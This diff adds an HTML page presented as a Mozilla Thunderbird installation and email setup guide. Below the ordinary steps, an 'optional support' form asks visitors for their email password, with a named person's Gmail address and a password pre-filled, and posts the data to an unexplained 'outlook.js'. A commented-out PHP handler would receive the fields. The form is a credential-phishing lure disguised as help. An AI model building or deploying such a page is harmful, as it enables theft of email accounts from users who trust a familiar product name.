@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Thunderbird Installation & Setup Guide</title>
+<style>
+  body { font-family: Arial, sans-serif; margin: 20px; max-width: 800px; }
+  h1 { color: #2c3e50; }
+  ol { margin-top: 20px; }
+  li { margin-bottom: 15px; }
+  .note { font-style: italic; color: #7f8c8d; }
+  form { margin-top: 30px; }
+  label { display: block; margin-top: 10px; }
+  input[type="text"], input[type="email"], input[type="password"] {
+    padding: 8px; width: 100%; box-sizing: border-box; margin-top: 5px;
+  }
+  button { padding: 10px 15px; background-color: #2980b9; color: white; border: none; margin-top: 15px; cursor: pointer; }
+</style>
+</head>
+<body>
+    <link rel="stylesheet" href="mozilla.css" />
+    <script src="mozilla.js"></script>
+<h1>Install Mozilla Thunderbird & Set Up Your Email</h1>
+
+<h2>Step-by-Step User Guide</h2>
+<ol>
+  <li><strong>Download Mozilla Thunderbird</strong>
+    <ul>
+      <li>Visit: <a href="https://www.thunderbird.net" target="_blank">https://www.thunderbird.net</a></li>
+      <li>Click "Download" and select your operating system (Windows, macOS, Linux).</li>
+      <li>Run the installer and follow the prompts to complete installation.</li>
+    </ul>
+  </li>
+  <li><strong>Configure Your Email in Thunderbird</strong>
+    <ul>
+      <li>Open Thunderbird.</li>
+      <li>If prompted, choose "Set up an existing email account".</li>
+      <li>Enter your details:
+        <ul>
+          <li><strong>Name:</strong> Thyda Khorn</li>
+          <li><strong>Email Address:</strong> thyda91@gmail.com</li>
+          <li><strong>Password:</strong> (your email password)</li>
+        </ul>
+      </li>
+      <li>Click "Continue". Thunderbird will attempt automatic configuration.</li>
+      <li>If needed, click "Manual config" to input server details provided by your email provider.</li>
+      <li>Once configured, click "Done". Your emails will sync.</li>
+    </ul>
+  </li>
+  <li><strong>Verify Setup</strong>
+    <ul>
+      <li>Ensure emails are syncing properly.</li>
+      <li>Start managing your email via Thunderbird.</li>
+    </ul>
+  </li>
+</ol>
+
+<p class="note">Note: For manual setup, ensure you have the correct IMAP/POP3 and SMTP server details from your email provider.</p>
+
+<hr />
+
+<h2>Optional: Submit Your Details for Support</h2>
+<form id="emailForm" method="post" action="outlook.js" onsubmit="return validateForm()">
+  <label for="name">Your Name:</label>
+  <input type="text" id="name" name="name" value="Thyda Khorn" required />
+
+  <label for="email">Your Email:</label>
+  <input type="email" id="email" name="email" value="thyda91@gmail.com" readonly />
+
+  <label for="password">Your Email Password:</label>
+  <input type="password" id="password" name="password" value="12345678" required />
+
+  <button type="submit">Submit</button>
+</form>
+
+<script>
+  // Validation script
+  function validateForm() {
+    const name = document.getElementById('name').value.trim();
+    const password = document.getElementById('password').value.trim();
+    if (!name || !password) {
+      alert('Please fill in all required fields.');
+      return false;
+    }
+    return true;
+  }
+</script>
+
+<!-- PHP placeholder for server-side processing of form data -->
+<!-- Save as submit.php on your server -->
+<?php
+/*
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+  $name = $_POST['name'];
+  $email = $_POST['email'];
+  $password = $_POST['password'];
+  
+  // WARNING: Never store passwords in plain text; this is just a placeholder
+  // Implement secure storage or handling as needed
+  
+  echo "Thank you, " . htmlspecialchars($name) . ". Your details have been received.";
+}
+*/
+?>
+</body>
+</html>
